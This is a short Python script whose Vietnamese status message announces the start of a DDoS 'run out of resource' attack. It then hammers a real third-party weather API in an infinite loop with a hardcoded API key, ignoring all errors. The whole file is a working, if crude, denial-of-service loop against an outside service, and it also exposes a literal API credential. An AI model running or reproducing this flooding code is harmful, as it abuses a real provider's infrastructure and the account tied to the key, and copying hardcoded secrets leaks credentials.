import requests

API_KEY = "8bc74a34f17c9ba358c691760dcc7e16"
url = f"http://api.weatherapi.com/v1/current.json?key={API_KEY}&q=Saigon"

print("Dang bat dau tan cong ddos run out of resource....")

while True:
    try:
        response = requests.get(url)
        print(f"URL thuc te dang goi: {response.url}")
        print(f"Trang thai: {response.status_code}")

    except:
        pass
